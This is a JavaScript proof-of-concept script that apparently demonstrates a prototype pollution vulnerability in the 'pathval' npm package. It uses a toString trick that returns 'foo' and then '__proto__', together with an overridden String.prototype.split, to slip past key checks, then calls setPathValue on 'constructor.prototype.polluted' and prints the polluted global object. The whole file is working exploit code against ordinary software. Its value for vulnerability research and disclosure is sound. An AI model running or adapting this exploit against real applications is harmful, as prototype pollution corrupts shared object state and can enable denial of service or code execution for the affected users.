var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);